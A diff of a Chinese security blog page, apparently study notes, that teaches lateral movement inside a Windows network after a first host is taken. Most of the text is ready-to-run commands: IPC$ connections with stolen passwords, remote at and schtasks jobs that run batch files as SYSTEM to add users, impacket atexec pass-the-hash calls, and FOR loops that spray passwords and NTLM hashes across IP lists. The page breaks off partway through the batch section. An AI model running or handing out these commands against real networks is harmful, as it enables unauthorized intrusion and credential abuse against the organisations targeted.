@@ -1,164 +1,20 @@
-<!DOCTYPE html>
-<html lang=zh>
-<head>
-    <!-- so meta -->
-    <meta charset="utf-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="HandheldFriendly" content="True">
-    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
-    <meta name="description" content="横向移动by小迪">
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0"/><meta name="author" content="jjjing"/><meta name="copyright" content="jjjing"/><meta name="theme-color" content="#FFB347"/><meta name="format-detection" content="telephone=no"/><meta name="keywords" content="Hexo Theme MEOW"/><meta name="mobile-web-app-capable" content="yes"/><meta name="apple-mobile-web-app-capable" content="yes"/><meta name="apple-touch-fullscreen" content="yes"/><meta name="application-name" content="横向移动 | xiaodisec | jjjing"/><meta name="apple-mobile-web-app-title" content="横向移动 | xiaodisec | jjjing"/><meta name="apple-mobile-web-app-status-bar-style" content="#FFB347"/><link rel="canonical" href="https://jinggg1123.github.io/archives/2022/08/06/横向移动xd/"/><meta name="description" content="at&amp;schtasks在拿下一台内网主机后，通过本地信息搜集收集用户凭证等信息后，如何横向渗透拿下更多的主机？ 在已知目标系统的用户明文密码的基础上，直接可以在远程主机上执行命令。 获取到某域主机权限 –&gt; minikatz得到密码（明文，hash）–&gt; 用到信息收集里面域用户的列表做用户名字典 –&gt; 用到密码明文当做密码字典 –&gt; 尝试连接 –&gt; 创建...">
 <meta property="og:type" content="article">
-<meta property="og:title" content="横向移动 | xiaodisec">
-<meta property="og:url" content="https://itsbefore.github.io/archives/2022/08/06/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8xd/index.html">
-<meta property="og:site_name" content="before">
-<meta property="og:description" content="横向移动by小迪">
+<meta property="og:title" content="横向移动 | xiaodisec | jjjing">
+<meta property="og:url" content="https://jinggg1123.github.io/archives/2022/08/06/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8xd/index.html">
+<meta property="og:site_name" content="jjjing">
+<meta property="og:description" content="at&amp;schtasks在拿下一台内网主机后，通过本地信息搜集收集用户凭证等信息后，如何横向渗透拿下更多的主机？ 在已知目标系统的用户明文密码的基础上，直接可以在远程主机上执行命令。 获取到某域主机权限 –&gt; minikatz得到密码（明文，hash）–&gt; 用到信息收集里面域用户的列表做用户名字典 –&gt; 用到密码明文当做密码字典 –&gt; 尝试连接 –&gt; 创建...">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://jinggg1123.github.io/archives/2022/08/06/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8xd/assets/images/Hexo-Theme-MEOW.png">
 <meta property="article:published_time" content="2022-08-06T07:11:33.000Z">
-<meta property="article:modified_time" content="2023-12-24T05:42:22.036Z">
-<meta property="article:author" content="before">
-<meta name="twitter:card" content="summary">
-    
-    
-      
-        
-          <link rel="shortcut icon" href="/images/favicon.ico">
-        
-      
-      
-        
-          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
-        
-      
-      
-        
-          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
-        
-      
-    
-    <!-- title -->
-    <title>横向移动 | xiaodisec</title>
-    <!-- async scripts -->
-    <!-- Google Analytics -->
-
-
-    <!-- Umami Analytics -->
-
-
-    <!-- styles -->
-    
+<meta property="article:modified_time" content="2024-12-08T13:23:39.547Z">
+<meta property="article:author" content="jjjing">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://jinggg1123.github.io/archives/2022/08/06/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8xd/assets/images/Hexo-Theme-MEOW.png"><meta name="robots" content="index,follow"/><meta name="googlebot" content="index,follow"/><meta name="revisit-after" content="1 days"/><title>横向移动 | xiaodisec | jjjing</title><link rel="shortcut icon" href="/assets/images/Hexo-Theme-MEOW.ico"><link rel="preconnect" href="/assets"/><link rel="preconnect" href="assets"/>
 <link rel="stylesheet" href="/css/style.css">
 
-    <!-- persian styles -->
-    
-    <!-- rss -->
-    
-    
-	<!-- mathjax -->
-	
-<meta name="generator" content="Hexo 6.1.0"></head>
-
-<body class="max-width mx-auto px3 ltr">
-    
-      <div id="header-post">
-  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
-  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
-  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
-  <span id="menu">
-    <span id="nav">
-      <ul>
-        <!--
-       --><li><a href="/">首页</a></li><!--
-     --><!--
-       --><li><a href="/archives/">归档</a></li><!--
-     --><!--
-       --><li><a href="/categories/">分类</a></li><!--
-     --><!--
-       --><li><a href="/about/">关于</a></li><!--
-     -->
-      </ul>
-    </span>
-    <br/>
-    <span id="actions">
-      <ul>
-        
-        <li><a class="icon" aria-label="上一篇" href="/2022/08/09/ctfshow%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
-        
-        
-        <li><a class="icon" aria-label="下一篇" href="/2022/08/05/%E4%BB%A3%E7%90%86%E3%80%81%E9%9A%A7%E9%81%93%E3%80%81%E7%A9%BF%E9%80%8F/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
-        
-        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
-        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
-      </ul>
-      <span id="i-prev" class="info" style="display:none;">上一篇</span>
-      <span id="i-next" class="info" style="display:none;">下一篇</span>
-      <span id="i-top" class="info" style="display:none;">返回顶部</span>
-      <span id="i-share" class="info" style="display:none;">分享文章</span>
-    </span>
-    <br/>
-    <div id="share" style="display: none">
-      <ul>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://itsbefore.github.io/archives/2022/08/06/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8xd/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://itsbefore.github.io/archives/2022/08/06/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8xd/&text=横向移动 | xiaodisec"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://itsbefore.github.io/archives/2022/08/06/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8xd/&title=横向移动 | xiaodisec"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://itsbefore.github.io/archives/2022/08/06/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8xd/&is_video=false&description=横向移动 | xiaodisec"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=横向移动 | xiaodisec&body=Check out this article: https://itsbefore.github.io/archives/2022/08/06/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8xd/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://itsbefore.github.io/archives/2022/08/06/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8xd/&title=横向移动 | xiaodisec"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://itsbefore.github.io/archives/2022/08/06/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8xd/&title=横向移动 | xiaodisec"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://itsbefore.github.io/archives/2022/08/06/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8xd/&title=横向移动 | xiaodisec"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://itsbefore.github.io/archives/2022/08/06/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8xd/&title=横向移动 | xiaodisec"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://itsbefore.github.io/archives/2022/08/06/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8xd/&name=横向移动 | xiaodisec&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://itsbefore.github.io/archives/2022/08/06/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8xd/&t=横向移动 | xiaodisec"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
-</ul>
-
-    </div>
-    
-    
-      <div id="toc">
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">at&amp;schtasks</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">1.1.</span> <span class="toc-text">at</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">1.2.</span> <span class="toc-text">schtasks</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">1.3.</span> <span class="toc-text">atexec-impacket</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">1.4.</span> <span class="toc-text">批量利用</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">2.</span> <span class="toc-text">psexec&amp;smbexec</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">2.1.</span> <span class="toc-text">psexec</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">2.2.</span> <span class="toc-text">smbexec</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">3.</span> <span class="toc-text">wmic&amp;wmiexec</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">4.</span> <span class="toc-text">PTH&amp;PTT&amp;PTK</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">4.1.</span> <span class="toc-text">PTH</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">4.2.</span> <span class="toc-text">PTK</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">4.3.</span> <span class="toc-text">PTT</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">5.</span> <span class="toc-text">RDP</span></a></li></ol>
-      </div>
-    
-  </span>
-</div>
-
-    
-    <div class="content index py4 ">
-        
-        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
-  <header>
-    
-    <h1 class="posttitle p-name" itemprop="name headline">
-        横向移动 | xiaodisec
-    </h1>
-
-
-
-    <div class="meta">
-      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
-        <span class="p-name" itemprop="name">before</span>
-      </span>
-      
-    <div class="postdate">
-      
-        <time datetime="2022-08-06T07:11:33.000Z" class="dt-published" itemprop="datePublished">2022-08-06</time>
-        
-      
-    </div>
-
-      
-    <div class="article-category">
-        <i class="fa-solid fa-archive"></i>
-        <a class="category-link" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a>
-    </div>
-
-
-      
-
-    </div>
-  </header>
-  
-
-  <div class="content e-content" itemprop="articleBody">
-    <h1><span id="atampschtasks">at&amp;schtasks</span></h1><p>在拿下一台内网主机后，通过本地信息搜集收集用户凭证等信息后，如何横向渗透拿下更多的主机？</p>
+<link rel="stylesheet" href="/css/third-party/dist/APlayer.min.css">
+<link rel="prefetch" href="/"/><link rel="prefetch" href="/archives"/><link rel="prefetch" href="/tags"/><meta name="generator" content="Hexo 6.3.0"></head><body bg-style="none"><div class="post-progressbar-container"><div class="post-progressbar"></div></div><header><div id="navbar"><div id="nav-info"><a id="site-icon" href="/" title="主页"><img src="/assets/images/Hexo-Theme-MEOW.png" alt="Logo"/></a><a id="site-name" href="/" title="主页"><div>jjjing</div><img src="/assets/images/svg/uc/uc-home.svg" class="icon noview" alt="Icon"></a></div><div id="nav-menu"></div><div id="nav-function"><div id="menu-btn"><a href="javascript:void(0);" title="打开菜单"><img src="/assets/images/svg/uc/uc-menu.svg" class="icon noview" alt="Icon"></a></div></div></div></header><div id="menu-aside"><div id="menu-aside-container"><div id="menu-aside-info"><a href="/" title="主页"><img src="/assets/images/Hexo-Theme-MEOW.png" alt="Logo"/></a><a href="/" title="主页">jjjing</a></div><hr/></div></div><main><div class="banner"><div class="banner-info"><div class="banner-avatar"><img src="/assets/images/Hexo-Theme-MEOW.png" alt="Avatar"/></div><div class="banner-title">「 MEOW 」</div></div></div><div class="post-container"><div class="post-main"><div class="post-content"><h1 class="post-title">横向移动 | xiaodisec</h1><div class="post-author"><span>作者: jjjing</span></div><div class="post-meta"><div class="post-info"><div class="post-date"><div class="post-pubdate"><img src="/assets/images/svg/ta/ta-pubdate.svg" class="icon noview" alt="Icon"><span>发表于2022-08-06</span></div><div class="post-update"><img src="/assets/images/svg/ta/ta-update.svg" class="icon noview" alt="Icon"><span>更新于2024-12-08</span></div></div><div class="post-read"></div></div><div class="post-attribute"><div class="post-categories"><img src="/assets/images/svg/ta/ta-category.svg" class="icon noview" alt="Icon"><span><a class="post-categories-link" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a></span></div></div></div><div class="post markdown" indent="false"><h1><span id="atampschtasks">at&amp;schtasks</span></h1><p>在拿下一台内网主机后，通过本地信息搜集收集用户凭证等信息后，如何横向渗透拿下更多的主机？</p>
 <p>在已知目标系统的用户明文密码的基础上，直接可以在远程主机上执行命令。</p>
 <p>获取到某域主机权限 –&gt; minikatz得到密码（明文，hash）–&gt; 用到信息收集里面域用户的列表做用户名字典 –&gt; 用到密码明文当做密码字典 –&gt; 尝试连接 –&gt; 创建计划任务(at|schtasks) –&gt; 执行文件（后门或命令）</p>
 <p>利用流程：</p>
@@ -168,88 +24,34 @@
 <li>查看目标时间，创建计划任务定时执行脚本</li>
 <li>删除IPC连接</li>
 </ol>
-<pre class="line-numbers language-none"><code class="language-none">#建立IPC连接
-net use \\10.1.1.1\IPC$ &quot;passwd&quot; &#x2F;user:username  #工作组
-net use \\10.1.1.1\IPC$ &quot;passwd&quot; &#x2F;user:domainname\username  #域
-
-dir \\10.1.1.1\c$\					#查看文件列表
-copy \\10.1.1.1\c$\1.bat 1.bat 		#下载文件
-copy 1.bat \\10.1.1.1\c$			#上传文件
-net use \\10.1.1.1\IPC$ &#x2F;del		#删除IPC连接
-net view 10.1.1.1					#查看对方共享
-
-建立IPC失败的原因：
-1. 目标系统不是NT或以上的操作系统
-2. 对方没有打开IPC$共享
-3. 对方未开启139、445端口，或者被防火墙屏蔽
-4. 账号密码错了<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<div class="code-container" code-lang="Powershell"><div class="codebox"><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#建立IPC连接</span></span><br><span class="line">net use \\<span class="number">10.1</span>.<span class="number">1.1</span>\IPC<span class="variable">$</span> <span class="string">&quot;passwd&quot;</span> /user:username  <span class="comment">#工作组</span></span><br><span class="line">net use \\<span class="number">10.1</span>.<span class="number">1.1</span>\IPC<span class="variable">$</span> <span class="string">&quot;passwd&quot;</span> /user:domainname\username  <span class="comment">#域</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">dir</span> \\<span class="number">10.1</span>.<span class="number">1.1</span>\c<span class="variable">$</span>\					<span class="comment">#查看文件列表</span></span><br><span class="line"><span class="built_in">copy</span> \\<span class="number">10.1</span>.<span class="number">1.1</span>\c<span class="variable">$</span>\<span class="number">1</span>.bat <span class="number">1</span>.bat 		<span class="comment">#下载文件</span></span><br><span class="line"><span class="built_in">copy</span> <span class="number">1</span>.bat \\<span class="number">10.1</span>.<span class="number">1.1</span>\c<span class="variable">$</span>			<span class="comment">#上传文件</span></span><br><span class="line">net use \\<span class="number">10.1</span>.<span class="number">1.1</span>\IPC<span class="variable">$</span> /<span class="built_in">del</span>		<span class="comment">#删除IPC连接</span></span><br><span class="line">net view <span class="number">10.1</span>.<span class="number">1.1</span>					<span class="comment">#查看对方共享</span></span><br><span class="line"></span><br><span class="line">建立IPC失败的原因：</span><br><span class="line"><span class="number">1</span>. 目标系统不是NT或以上的操作系统</span><br><span class="line"><span class="number">2</span>. 对方没有打开IPC<span class="variable">$</span>共享</span><br><span class="line"><span class="number">3</span>. 对方未开启<span class="number">139</span>、<span class="number">445</span>端口，或者被防火墙屏蔽</span><br><span class="line"><span class="number">4</span>. 账号密码错了</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
 
 
 
 <h2><span id="at">at</span></h2><p><code>&lt;Windows2012</code></p>
 <p>建立ipc连接，然后把执行文件copy上去，再使用at命令添加计划任务。</p>
-<pre class="line-numbers language-none"><code class="language-none">at \\10.1.1.1\ 11:30 C:\hh.bat
-at \\10.1.1.1    1 &#x2F;delete
-&#x2F;&#x2F; 1为计划任务的ID<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<div class="code-container" code-lang="Livecodeserver"><div class="codebox"><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">at</span> \\<span class="number">10.1</span><span class="number">.1</span><span class="number">.1</span>\ <span class="number">11</span>:<span class="number">30</span> C:\hh.bat</span><br><span class="line"><span class="keyword">at</span> \\<span class="number">10.1</span><span class="number">.1</span><span class="number">.1</span>    <span class="number">1</span> /<span class="built_in">delete</span><span class="comment"></span></span><br><span class="line"><span class="comment">// 1为计划任务的ID</span></span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
 
 
 
 <h2><span id="schtasks">schtasks</span></h2><p><code>&gt;=windows2012</code></p>
 <p>建立ipc连接，然后把执行文件copy上去，再使用schtasks命令添加计划任务。</p>
-<pre class="line-numbers language-none"><code class="language-none">#在10.1.1.1创建任务名为adduser，每天执行的，文件路径为C:\add.bat的任务
-schtasks &#x2F;create &#x2F;s 10.1.1.1 &#x2F;ru &quot;SYSTEM&quot; &#x2F;tn adduser &#x2F;sc DAILY &#x2F;tr C:\add.bat &#x2F;F
-
-#运行adduser任务
-schtasks &#x2F;run &#x2F;s 10.1.1.1 &#x2F;tn adduser &#x2F;i
-
-#删除adduser任务
-schtasks &#x2F;delete &#x2F;s 10.1.1.1 &#x2F;tn adduser &#x2F;f<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<div class="code-container" code-lang="Jboss-cli"><div class="codebox"><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#在10.1.1.1创建任务名为adduser，每天执行的，文件路径为C:\add.bat的任务</span></span><br><span class="line">schtasks <span class="string">/create</span> <span class="string">/s</span> 10.1.1.1 <span class="string">/ru</span> <span class="string">&quot;SYSTEM&quot;</span> <span class="string">/tn</span> adduser <span class="string">/sc</span> DAILY <span class="string">/tr</span> C:\add.bat <span class="string">/F</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#运行adduser任务</span></span><br><span class="line">schtasks <span class="string">/run</span> <span class="string">/s</span> 10.1.1.1 <span class="string">/tn</span> adduser <span class="string">/i</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#删除adduser任务</span></span><br><span class="line">schtasks <span class="string">/delete</span> <span class="string">/s</span> 10.1.1.1 <span class="string">/tn</span> adduser <span class="string">/f</span></span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
 
 
 
 <h2><span id="atexec-impacket">atexec-impacket</span></h2><p>可以看到以上两种方法都是明文密码，但是我们信息搜集的时候可能会得到hash值，就没有办法去连接。这里使用一款工具<code>impacket</code>里的<code>atexec</code>。</p>
 <p>可以直接使用命令，但是不免杀。</p>
-<pre class="line-numbers language-none"><code class="language-none">atexec.exe administrator:666.com@10.1.1.1 &quot;whoami&quot;
-atexec.exe ZJ&#x2F;administrator:666.com@10.1.1.1 &quot;whoami&quot;
-atexec.exe -hashes :6f8a61c6702f90ae246aa2a298fcdc35333 administrator@10.1.1.1 &quot;whoami&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<div class="code-container" code-lang="Apache"><div class="codebox"><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">atexec</span>.exe administrator:<span class="number">666</span>.com@<span class="number">10.1.1.1</span> <span class="string">&quot;whoami&quot;</span></span><br><span class="line"><span class="attribute">atexec</span>.exe ZJ/administrator:<span class="number">666</span>.com@<span class="number">10.1.1.1</span> <span class="string">&quot;whoami&quot;</span></span><br><span class="line"><span class="attribute">atexec</span>.exe -hashes :<span class="number">6</span>f8a61c6702f90ae246aa2a298fcdc35333 administrator@<span class="number">10.1.1.1</span> <span class="string">&quot;whoami&quot;</span></span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
 
 
 
 <h2><span id="批量利用">批量利用</span></h2><p>俭朴版：</p>
-<pre class="line-numbers language-none"><code class="language-none">#扫到存活ip后保存在一个ips.txt的文件,pass.txt、hash.txt是由mimikatz来的.
-
-FOR &#x2F;F %%i in (ips.txt) do net use \\%%i\IPC$ &quot;666.com&quot; &#x2F;user:administrator	#变量ip
-
-FOR &#x2F;F %%i in (ips.txt) do atexec.exe .&#x2F;administrator:666.com@%%i &quot;whoami&quot;	#变量ip
-
-FOR &#x2F;F %%i in (pass.txt) do atexec.exe .&#x2F;administrator:%%i@10.1.1.1 &quot;whoami&quot; #变量pass
-
-FOR &#x2F;F %%i in (hash.txt) do atexec.exe -hashes :%%i .&#x2F;administrator@10.1.1.1 &quot;whoami&quot; #变量hash <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<div class="code-container" code-lang="Elixir"><div class="codebox"><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#扫到存活ip后保存在一个ips.txt的文件,pass.txt、hash.txt是由mimikatz来的.</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">FOR</span> /F %%i <span class="keyword">in</span> (ips.txt) <span class="keyword">do</span> net <span class="keyword">use</span> \\%%i\<span class="title class_">IPC</span><span class="variable">$ </span><span class="string">&quot;666.com&quot;</span> /<span class="symbol">user:</span>administrator	<span class="comment">#变量ip</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">FOR</span> /F %%i <span class="keyword">in</span> (ips.txt) <span class="keyword">do</span> atexec.exe ./<span class="symbol">administrator:</span><span class="number">666</span>.com@%%i <span class="string">&quot;whoami&quot;</span>	<span class="comment">#变量ip</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">FOR</span> /F %%i <span class="keyword">in</span> (pass.txt) <span class="keyword">do</span> atexec.exe ./<span class="symbol">administrator:</span>%%i<span class="variable">@10</span>.<span class="number">1.1</span>.<span class="number">1</span> <span class="string">&quot;whoami&quot;</span> <span class="comment">#变量pass</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">FOR</span> /F %%i <span class="keyword">in</span> (hash.txt) <span class="keyword">do</span> atexec.exe -hashes <span class="symbol">:%%i</span> ./administrator<span class="variable">@10</span>.<span class="number">1.1</span>.<span class="number">1</span> <span class="string">&quot;whoami&quot;</span> <span class="comment">#变量hash </span></span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg 